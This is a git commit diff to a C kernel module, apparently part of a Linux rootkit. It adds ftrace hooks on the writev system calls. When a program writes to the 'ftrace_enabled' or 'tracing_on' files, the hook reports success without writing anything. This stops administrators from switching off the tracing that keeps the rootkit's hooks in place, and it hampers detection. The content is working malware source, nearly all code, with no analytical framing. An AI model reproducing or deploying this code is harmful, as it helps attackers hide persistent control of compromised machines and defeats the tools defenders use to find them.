151452a3116c921f9f3635148261a64380dc1840
matheuz <88067225+MatheuZSecurity@users.noreply.github.com>
2025-10-08 13:59:32 -0300

    Update hooks_write.c

--- modules/hooks_write.c
+++ modules/hooks_write.c
@@ -6,6 +6,8 @@
 
 static asmlinkage ssize_t (*original_write)(const struct pt_regs *);
 static asmlinkage ssize_t (*original_write32)(const struct pt_regs *);
+static asmlinkage ssize_t (*original_writev)(const struct pt_regs *);
+static asmlinkage ssize_t (*original_writev32)(const struct pt_regs *);
 
 static notrace asmlinkage ssize_t hooked_write_common(const struct pt_regs *regs,
                                                      asmlinkage ssize_t (*orig)(const struct pt_regs *),
@@ -65,9 +67,53 @@ static notrace asmlinkage ssize_t hooked_write32(const struct pt_regs *regs)
     return hooked_write_common(regs, original_write32, true);
 }
 
+static notrace asmlinkage ssize_t hooked_writev_common(const struct pt_regs *regs,
+                                                      asmlinkage ssize_t (*orig)(const struct pt_regs *),
+                                                      bool compat32)
+{
+    int fd;
+    const struct iovec __user *vec;
+    unsigned long vlen;
+
+    if (!compat32) {
+        fd   = regs->di;
+        vec  = (const struct iovec __user *)regs->si;
+        vlen = regs->dx;
+    } else {
+        fd   = regs->bx;
+        vec  = (const struct iovec __user *)regs->cx;
+        vlen = regs->dx;
+    }
+
+    struct file *file = fget(fd);
+    if (!file)
+        return orig(regs);
+
+    const char *name = file->f_path.dentry->d_name.name;
+    if (strcmp(name, "ftrace_enabled") == 0 || strcmp(name, "tracing_on") == 0) {
+        fput(file);
+        return vlen;
+    }
+
+    fput(file);
+    return orig(regs);
+}
+
+static notrace asmlinkage ssize_t hooked_writev(const struct pt_regs *regs)
+{
+    return hooked_writev_common(regs, original_writev, false);
+}
+
+static notrace asmlinkage ssize_t hooked_writev32(const struct pt_regs *regs)
+{
+    return hooked_writev_common(regs, original_writev32, true);
+}
+
 static struct ftrace_hook hooks[] = {
-    HOOK("__x64_sys_write",  hooked_write,  &original_write),
-    HOOK("__ia32_sys_write", hooked_write32, &original_write32),
+    HOOK("__x64_sys_write",   hooked_write,   &original_write),
+    HOOK("__ia32_sys_write",  hooked_write32, &original_write32),
+    HOOK("__x64_sys_writev",  hooked_writev,  &original_writev),
+    HOOK("__ia32_sys_writev", hooked_writev32, &original_writev32),
 };
 
 notrace int hooks_write_init(void)
